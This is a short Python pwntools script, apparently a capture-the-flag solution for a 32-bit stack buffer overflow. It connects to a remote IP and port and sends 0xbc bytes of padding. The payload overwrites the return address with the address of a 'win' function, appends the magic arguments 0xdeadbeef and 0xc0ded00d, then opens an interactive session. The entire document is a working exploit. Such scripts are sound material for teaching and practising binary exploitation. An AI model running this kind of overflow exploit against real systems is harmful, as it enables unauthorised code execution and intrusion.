from pwn import * 
p=remote("83.136.249.57",47025)
#p=process("./vuln")
win=0x080491e2
#gdb.attach(p)
p.sendline(b"a"*0xbc+p32(win)+b"a"*4+p32(0xdeadbeef)+p32(0xc0ded00d))

p.interactive()
